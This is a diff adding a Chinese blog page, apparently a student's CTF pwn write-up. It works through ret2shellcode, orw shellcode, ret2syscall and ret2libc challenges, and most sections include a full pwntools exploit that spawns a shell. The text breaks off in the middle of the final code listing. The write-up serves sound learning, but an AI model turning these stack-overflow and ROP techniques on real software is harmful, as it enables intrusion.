@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html>
+  <head>
+     
+    <meta charset="UTF-8">
+    <title>集训3-4周wp - Hexo</title>
+    <link rel="shortcut icon" href="/static/img/icon.png">
+    <link rel="icon" href="/static/img/icon.png" sizes="192x192"/>
+    
+<link rel="stylesheet" href="/static/kico.css">
+<link rel="stylesheet" href="/static/hingle.css">
+
+    
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+
+    <meta name="viewport" content="width=device-width, maximum-scale=1, initial-scale=1"/>
+    <meta property="og:site_name" content="Hexo">
+    <meta property="og:title" content="集训3-4周wp"/>
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+  <body>
+    <header>
+    <div class="head-title">
+        <h4>Hexo</h4>
+    </div>
+    <div class="head-action">
+        <div class="toggle-btn"></div>
+        <div class="light-btn"></div>
+        <div class="search-btn"></div>
+    </div>
+    <form class="head-search" method="post">
+        <input type="text" name="s" placeholder="搜索什么？">
+    </form>
+    <nav class="head-menu">
+        <a href="/">首页</a>
+        <div class="has-child">
+            <a>分类</a>
+            <div class="sub-menu">
+                
+            </div>
+        </div>
+        
+            <a href="/about">关于我</a>
+        
+            <a href="/friends">朋友们</a>
+        
+    </nav>
+</header>
+
+    <main>
+    <div class="wrap min">
+        <section class="post-title">
+            <h2>集训3-4周wp</h2>
+            <div class="post-meta">
+                <time class="date">2024.03.05</time>
+            
+            </div>
+        </section>
+        <article class="post-content">
+        
+            <h1 id="0x01-1-jarvisoj-XMAN-level1：栈上shellcode"><a href="#0x01-1-jarvisoj-XMAN-level1：栈上shellcode" class="headerlink" title="0x01 1.jarvisoj[XMAN]level1：栈上shellcode"></a>0x01 1.jarvisoj[XMAN]level1：栈上shellcode</h1><p>先file看一下，32位程序</p>
+<p><img src="https://img.picgo.net/2023/10/30/Snipaste_2023-10-30_17-11-249b51b06505eefdde.png" alt="Snipaste_2023-10-30_17-11-249b51b06505eefdde.png"></p>
+<p>再checksec一下，发现几乎啥都没开，可以执行shellcode，所以ret2shellcode</p>
+<p><img src="https://img.picgo.net/2023/10/30/Snipaste_2023-10-30_17-13-14761e8dcc4bb1c979.png" alt="Snipaste_2023-10-30_17-13-14761e8dcc4bb1c979.png"></p>
+<p>32位ida打开，看到一个有漏洞的函数，打开 。</p>
+<p><img src="https://img.picgo.net/2023/10/30/Snipaste_2023-10-30_17-16-023c34c26b1bca0349.png" alt="Snipaste_2023-10-30_17-16-023c34c26b1bca0349.png"></p>
+<p>一眼栈溢出了，136字节空间读了0x100字节，而且输出里面有个%p，把buf的地址泄露了。</p>
+<p><img src="https://img.picgo.net/2023/10/30/Snipaste_2023-10-30_17-16-58bc89816cea02f2ae.png" alt="Snipaste_2023-10-30_17-16-58bc89816cea02f2ae.png"></p>
+<p>那么思路就有了，向程序写入shellcode，然后返回到shellcode的储存地址来执行它，从而get shell，接下来写exp。</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">ip = <span class="string">&#x27;pwn2.jarvisoj.com:9877&#x27;</span>.split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line"><span class="comment">#c = process(&quot;/CTF/week34/source/1level1&quot;)</span></span><br><span class="line"><span class="comment">#gdb.attach(c)</span></span><br><span class="line">c = remote(ip[<span class="number">0</span>],ip[<span class="number">1</span>])</span><br><span class="line">sh = asm(shellcraft.sh())</span><br><span class="line">p = sh.ljust(<span class="number">140</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">a = c.recv()</span><br><span class="line">addr = <span class="built_in">str</span>(a)[-<span class="number">14</span>:-<span class="number">4</span>]</span><br><span class="line">p += p32(<span class="built_in">int</span>(addr,<span class="number">16</span>))</span><br><span class="line">c.sendline(p)</span><br><span class="line">c.interactive()</span><br><span class="line"><span class="comment">#func_addr = 0x0804847b</span></span><br><span class="line"><span class="comment">#flag = CTF&#123;82c2aa534a9dede9c3a0045d0fec8617&#125;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Q：这个recv到的地址（0x开头的）怎么切片出来转成int型从而放到p32里面，我写的很抽象，给个优雅一点的写法球球了。</p>
+</blockquote>
+<p><del>接下来就不用说了叭</del></p>
+<h1 id="0x02-2-安恒某比赛链接：orw"><a href="#0x02-2-安恒某比赛链接：orw" class="headerlink" title="0x02 2.安恒某比赛链接：orw"></a>0x02 2.安恒某比赛<a target="_blank" rel="noopener" href="https://wwyc.lanzouq.com/i9fTI1d6ilaf">链接</a>：orw</h1><p>这题才是最难最折磨的好吧。。。</p>
+<p><img src="https://img.picgo.net/2023/11/07/Snipaste_2023-11-07_21-14-3594f5c816c912089a.png" alt="Snipaste_2023-11-07_21-14-3594f5c816c912089a.png"></p>
+<p>多亏了万里哥的知道，知道了call指令的用法，这里四行指令的作用分别是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">call _read         调用了read进行输出</span><br><span class="line">lea rdx,[rbp+buf]  把rbp+buf的值赋值给rdx</span><br><span class="line">mov eax,0          将eax赋值为0(没啥用)</span><br><span class="line">call rdx           跳到rdx地址上开始执行指令</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img.picgo.net/2023/11/07/Snipaste_2023-11-07_21-19-15c2bc16c1efcd846d.png" alt="Snipaste_2023-11-07_21-19-15c2bc16c1efcd846d.png"></p>
+<p>然后通过ida可知前面read将输出读到了buf中,所以整个整个程序的作用就是读入并且执行shellcode,连栈溢出都不用了,<del>真是良心啊</del>…</p>
+<p>根据提示orw,即是open,read,write,用seccomp查看一下禁用了什么系统调用即可.</p>
+<p>发现open被禁用,而openat可以使用,read,write都是可以用的,写exp把flag输出来即可</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">c = process(<span class="string">&quot;/CTF/week34/source/2babyshell&quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(c)</span></span><br><span class="line">p = asm(shellcraft.openat((-<span class="number">100</span>),<span class="string">&#x27;./flag&#x27;</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">t= <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rcx,rax</span></span><br><span class="line"><span class="string">mov rdx,rsp</span></span><br><span class="line"><span class="string">sub rdx,20</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">p += asm(t)</span><br><span class="line">p += asm(shellcraft.read(<span class="string">&#x27;rcx&#x27;</span>,<span class="string">&#x27;rsp&#x27;</span>,<span class="number">20</span>))</span><br><span class="line">p += asm(shellcraft.write(<span class="number">1</span>,<span class="string">&#x27;rsp&#x27;</span>,<span class="number">20</span>))</span><br><span class="line">c.sendline(p)</span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>但这不是最折磨的,折磨的是这个openat函数和fd文件描述符…</p>
+<p>其实我上面这个exp是拿不到flag的,当openat的第二个参数是绝对地址时才能拿到flag,但是打远程怎么可能猜到绝对地址,可是无论我怎么试都无法用相对地址拿到flag,后来查找到了当openat的第一个参数为-100时,openat等价于open,可是试了不成功,继续折磨,最后放弃,希望哪位大佬来解答一下.</p>
+</blockquote>
+<h1 id="0x03-3-ret2syscall题目链接：32位"><a href="#0x03-3-ret2syscall题目链接：32位" class="headerlink" title="0x03 3.ret2syscall题目链接：32位"></a>0x03 3.ret2syscall<a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop">题目链接</a>：32位</h1><p>file看一下32位，开了NX，ida打开看一下。<img src="https://img.picgo.net/2023/11/03/Snipaste_2023-11-03_20-13-17acdbfb6012f0193f.png" alt="Snipaste_2023-11-03_20-13-17acdbfb6012f0193f.png"></p>
+<p>一眼get栈溢出，再找找发现没有后门函数，所以当然是hint里写的ret2syscall啦。</p>
+<p>bing一下发现：想要执行execve(“&#x2F;bin&#x2F;sh”)的话需要改寄存器如下：</p>
+<blockquote>
+<p>eax &#x3D; 0x0b    ebx &#x3D; “&#x2F;bin&#x2F;sh”	ecx &#x3D; 0	edx &#x3D; 0</p>
+<p>最后执行	int 0x80	即可</p>
+</blockquote>
+<p>用ROPgadget找一找指令片段，格式如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary 3rop --only &quot;pop|ret&quot;  | grep 寄存器名</span><br></pre></td></tr></table></figure>
+
+<p>很容易就可以找到如下片段：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 0x080bb196 : pop eax ; ret</span><br><span class="line"># 0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</span><br></pre></td></tr></table></figure>
+
+<p>可以把4个寄存器都改了，接下来找有没有”&#x2F;bin&#x2F;sh”字符串。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary 3rop --string &quot;/bin/sh&quot;   </span><br></pre></td></tr></table></figure>
+
+<p>用ida也可以很容易的找到，写下来写exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">c = process(<span class="string">&quot;/CTF/week34/source/3rop&quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(c)</span></span><br><span class="line">eax = p32(<span class="number">0x080bb196</span>)</span><br><span class="line">edcbx = p32(<span class="number">0x0806eb90</span>)</span><br><span class="line">sh_addr = p32(<span class="number">0x080be408</span>)</span><br><span class="line">int_0x80 = p32(<span class="number">0x08049421</span>)</span><br><span class="line">p = <span class="string">b&#x27;a&#x27;</span>*<span class="number">112</span>+eax+p32(<span class="number">0x0b</span>)+edcbx+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+sh_addr+int_0x80</span><br><span class="line">c.sendline(p)</span><br><span class="line">c.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x080bb196 : pop eax ; ret | 0x0b</span></span><br><span class="line"><span class="comment"># 0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret | 0,0,/bin/sh</span></span><br></pre></td></tr></table></figure>
+
+<p>运行即可get shell。</p>
+<h1 id="0x04-4-NSSCTF-CISCN-2023-初赛-烧烤摊儿：64位syscall"><a href="#0x04-4-NSSCTF-CISCN-2023-初赛-烧烤摊儿：64位syscall" class="headerlink" title="0x04 4.NSSCTF[CISCN 2023 初赛]烧烤摊儿：64位syscall"></a>0x04 4.NSSCTF[CISCN 2023 初赛]烧烤摊儿：64位syscall</h1><p>万恶之源烧烤摊,做这题的时候ida罢工了,<del>高贵的盲打选手上线</del>,所以我们跳过静态分析,直接动态调试,开始思路和新生赛Genshin Impact那题一样,我买负数量的啤酒不就是虚空印钞么(doge)</p>
+<p><img src="https://img.picgo.net/2023/11/07/Snipaste_2023-11-07_21-58-084f91cc001fd75e83.png" alt="Snipaste_2023-11-07_21-58-084f91cc001fd75e83.png"></p>
+<p>然后承包了烧烤摊就可以看到输入框,大胆猜一下这里就是溢出点,</p>
+<p><img src="https://img.picgo.net/2023/11/07/Snipaste_2023-11-07_22-00-3435f77d92437630f7.png" alt="Snipaste_2023-11-07_22-00-3435f77d92437630f7.png"></p>
+<p>然后很简单,在输入的时候ctrl+c中断,利用cyclic生成有序垃圾字符串,c回车继续,输入这个字符串,发现ret报错了 ,再利用cyclic -l 把报错的输入进去得到偏移为</p>
+<p><img src="https://img.picgo.net/2023/11/07/Snipaste_2023-11-07_22-03-10f41ce4d331c75406.png" alt="Snipaste_2023-11-07_22-03-10f41ce4d331c75406.png"></p>
+<p><img src="https://img.picgo.net/2023/11/07/Snipaste_2023-11-07_22-05-50f6d3a60ca45f5761.png" alt="Snipaste_2023-11-07_22-05-50f6d3a60ca45f5761.png"></p>
+<p>然后再来一遍,把名字改成”&#x2F;bin&#x2F;sh”并使用search得到”&#x2F;bin&#x2F;sh”的地址:</p>
+<p><img src="https://img.picgo.net/2023/11/07/Snipaste_2023-11-07_22-07-5227665b6abfd356b5.png" alt="Snipaste_2023-11-07_22-07-5227665b6abfd356b5.png"></p>
+<p>接下来就是编写rop来执行system(“&#x2F;bin&#x2F;sh”)了,使用rop找到系统调用syscall的地址,并且在执行syscall之前设定好各个有关寄存器的值,就可以get shell了,其中寄存器的值分别为:</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rax = <span class="number">59</span>   rdi = <span class="string">&quot;/bin/sh&quot;</span>的地址</span><br><span class="line">rdx = <span class="number">0</span>    rsi = <span class="number">0</span></span><br></pre></td></tr></table></figure>
+
+<p>最后是exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">ip = <span class="string">&#x27;node4.anna.nssctf.cn:28646&#x27;</span>.split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line"><span class="comment">#c = remote(ip[0],ip[1])</span></span><br><span class="line">c = process(<span class="string">&quot;/CTF/week34/source/4shaokao&quot;</span>)</span><br><span class="line">gdb.attach(c)</span><br><span class="line">rax = <span class="number">0x0000000000458827</span></span><br><span class="line">rdi = <span class="number">0x000000000040264f</span></span><br><span class="line">rdxrbx = <span class="number">0x00000000004a404b</span></span><br><span class="line">rsi = <span class="number">0x000000000040a67e</span></span><br><span class="line">syscall = <span class="number">0x0000000000402404</span></span><br><span class="line">binsh = <span class="number">0x4E60F0</span></span><br><span class="line">p=<span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line">p=p.ljust(<span class="number">40</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">p+=p64(rax)+p64(<span class="number">59</span>)+p64(rdi)+p64(binsh)+p64(rdxrbx)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(rsi)+p64(<span class="number">0</span>)+p64(syscall)</span><br><span class="line"></span><br><span class="line"><span class="comment"># vuln 0x0000000000401f8d</span></span><br><span class="line"><span class="comment"># offset = 40</span></span><br><span class="line"><span class="comment"># rsp 0x7fffffffe130</span></span><br><span class="line"><span class="comment"># 0x0000000000402404 : syscall</span></span><br><span class="line"><span class="comment"># 0x0000000000458827 : pop rax ; ret | 59</span></span><br><span class="line"><span class="comment"># 0x000000000040264f : pop rdi ; ret | /bin/sh</span></span><br><span class="line"><span class="comment"># 0x00000000004a404b : pop rdx ; pop rbx ; ret | 0</span></span><br><span class="line"><span class="comment"># 0x000000000040a67e : pop rsi ; ret | 0</span></span><br><span class="line"></span><br><span class="line">c.recv()</span><br><span class="line">c.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">c.recv()</span><br><span class="line">c.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">c.recv()</span><br><span class="line">c.sendline(<span class="string">b&#x27;-1000000&#x27;</span>)</span><br><span class="line">c.recv()</span><br><span class="line">c.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">c.recv()</span><br><span class="line">c.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">c.recv()</span><br><span class="line">c.sendline(p)</span><br><span class="line">c.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="0x05-5-BUUciscn-2019-c-1：32位ret2libc"><a href="#0x05-5-BUUciscn-2019-c-1：32位ret2libc" class="headerlink" title="0x05 5.BUUciscn_2019_c_1：32位ret2libc"></a>0x05 5.BUUciscn_2019_c_1：32位ret2libc</h1><p>12周被这题关死,34周还是逃不过这题,开启新支线__ret2libc,got,plt看不懂,折磨了好久.</p>
+<p>ida打开,非常正常的没给后门函数.</p>
+<p><img src="https://img.picgo.net/2023/11/07/Snipaste_2023-11-07_21-39-15a750317b110c8984.png" alt="Snipaste_2023-11-07_21-39-15a750317b110c8984.png"></p>
+<p><img src="https://img.picgo.net/2023/11/07/Snipaste_2023-11-07_21-41-025e59fea6aa1d13a7.png" alt="Snipaste_2023-11-07_21-41-025e59fea6aa1d13a7.png"></p>
+<p>main里没有溢出点,encrypt()点进去一眼gets()栈溢出,并且之前使用了puts函数,那就泄露pots的got表地址.构造payload如下:</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="string">b&#x27;\0&#x27;</span>.ljust(<span class="number">0x58</span>,<span class="string">b&#x27;a&#x27;</span>)+rdi+puts_got+puts_plt+main</span><br></pre></td></tr></table></figure>
+
+<p>这里利用puts函数将泄露的地址打印出来,因为64位程序以寄存器传参(顺序见0x06),所以之前还要用rop找一下pop rdi的位置.将返回地址覆盖为puts的plt地址可以调用puts函数,最后再返回main,让函数从头再来,以便于第二次栈溢出的时候运行system(‘&#x2F;bin&#x2F;sh’)以get shell.</p>
+<p>总的exp如下:</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">ip = <span class="string">&#x27;node4.buuoj.cn:28515&#x27;</span>.split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">c = remote(ip[<span class="number">0</span>],ip[<span class="number">1</span>])</span><br><span class="line"><span class="comment">#c = process(&#x27;/CTF/week34/source/5ciscn_2019_c_1&#x27;)</span></span><br><span class="line">ret2libc3 = ELF(<span class="string">&#x27;/CTF/week34/source/5ciscn_2019_c_1&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(c, &quot;b * 0x400ae8&quot;)</span></span><br><span class="line"></span><br><span class="line">puts_plt            = p64(ret2libc3.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">puts_got            = p64(ret2libc3.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">libc_start_main_got = p64(ret2libc3.got[<span class="string">&#x27;__libc_start_main&#x27;</span>])</span><br><span class="line">main                = p64(ret2libc3.symbols[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line">rdi                 = p64(<span class="number">0x0000000000400c83</span>)</span><br><span class="line">ret                 = p64(<span class="number">0x00000000004006b9</span>)</span><br><span class="line"></span><br><span class="line">p = <span class="string">b&#x27;\0&#x27;</span>.ljust(<span class="number">0x58</span>,<span class="string">b&#x27;a&#x27;</span>)+rdi+puts_got+puts_plt+main</span><br><span class="line">c.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">c.sendline(p)</span><br><span class="line">c.recvuntil(<span class="string">b&#x27;Ciphertext\n&#x27;</span>)</span><br><span class="line">c.recvline()</span><br><span class="line"></span><br><span class="line">puts_addr = u64(c.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line"><span class="comment">#puts_addr = int(input(&quot;&gt;&gt;&gt;&quot;), 16)</span></span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libcbase = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system_addr = p64(libcbase + libc.dump(<span class="string">&#x27;system&#x27;</span>))</span><br><span class="line">binsh_addr = p64(libcbase + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">p = <span class="string">b&#x27;\0&#x27;</span>.ljust(<span class="number">0x58</span>,<span class="string">b&#x27;a&#x27;</span>)+ret+rdi+binsh_addr+system_addr</span><br><span class="line"></span><br><span class="line">c.recv()</span><br><span class="line">c.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">c.sendline(p)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># offset = 0x58</span></span><br><span class="line"><span class="comment"># 0x000000000040045c : sh</span></span><br><span class="line"><span class="comment"># 0x0000000000400c83 : pop rdi ; ret</span></span><br><span class="line"><span class="comment"># 0x00000000004006b9 : ret</span></span><br><span class="line"><span class="comment"># 0x0000000000400ae8 &lt;+244&gt;:   ret</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>注意第二个p(payload): “p &#x3D; b’\0’.ljust(0x58,b’a’)+ret+rdi+binsh_addr+system_addr”</p>
+<p>这里加了一个ret是为了栈平衡,原理尚未学习.<del>忙炸了</del></p>
+</blockquote>
+<h1 id="0x06-BUU-HarekazeCTF2019-baby-rop2：64位ret2libc"><a href="#0x06-BUU-HarekazeCTF2019-baby-rop2：64位ret2libc" class="headerlink" title="0x06 BUU[HarekazeCTF2019]baby_rop2：64位ret2libc"></a>0x06 BUU[HarekazeCTF2019]baby_rop2：64位ret2libc</h1><p>checksec和file就不说了，ida打开：</p>
+<p><img src="https://img.picgo.net/2023/11/07/Snipaste_2023-11-07_11-27-3804f83bd7692a81c2.png" alt="Snipaste_2023-11-07_11-27-3804f83bd7692a81c2.png"></p>
+<p>一眼buf溢出了，并且找了一下没有后门函数，所以是ret2libc</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br></pre></td></tr></table></figure>
+
+<p>用GPT查了一下这俩行，意思是缓冲区设置为零，实时输出输出。</p>
+<blockquote>
+<p>Q:哪位大佬给我解释一下上面这两句啊,我还是不是很理解</p>
+</blockquote>
+<p>首先是泄露libc，这里read前调用了printf和read，所以可以泄露read和printf的got表地址。<br>由于是64位程序，传参的时候需要用到寄存器，顺序如下：(我这里泄露的是read的got表地址)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># 使用rdi,rsi,rdx,rcx,r8,r9传递参数</span><br></pre></td></tr></table></figure>
+
+<p>printf(rdi,rsi)<br>大概就是这样的用法，这边有两个参数要设置，所以我们要找到设置rdi，rsi寄存器的指令</p>
+<p>rop找一下很容易就找到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 0x0000000000400733 : pop rdi ; ret</span><br><span class="line"># 0x0000000000400731 : pop rsi ; pop r15 ; ret</span><br></pre></td></tr></table></figure>
+
+<p>printf因为要格式化字符串,所以直接用题目里printf的第一个参数”Welcome to the Pwn World again, %s!\n”,然后第二个参数设置成read函数的got表地址,先写泄露地址的payload:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+rdi+ _s +rsi_r15+read_got+p64(<span class="number">0</span>)+printf_plt+main_addr <span class="comment">#read</span></span><br><span class="line">c.sendline(p) </span><br><span class="line">read_addr = u64(c.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;read&#x27;</span>, read_addr)  </span><br><span class="line">libc_base = read_addr - libc.dump(<span class="string">&#x27;read&#x27;</span>)  </span><br><span class="line"></span><br><span class="line">system_addr = p64(libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>))</span><br><span class="line">binsh_addr = p64(libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>))</span><br></pre></td></tr></table></figure>
+
+<p>然后接收read的地址,得到libc基地址,并且查找到system函数地址和’&#x2F;bin&#x2F;sh’字符串.</p>
+<p>注意这句话:</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read_addr = u64(c.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>))</span><br></pre></td></tr></table></figure>
+
+<p>网上协调来的exp:”接收地址的你看看基本上都是7个字节的，7f开头，补全8个字节”,只能说好用滴很.</p>
+<p>然后再写exp执行system(‘&#x2F;bin&#x2F;sh’):</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+rdi+binsh_addr+system_addr</span><br><span class="line">c.recv()</span><br><span class="line">c.sendline(p)</span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>即可拿到shell,但是ls发现没有flag</p>
+<p>这里用一下find指令,写在完整exp结尾了,接下来是完整exp:</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span 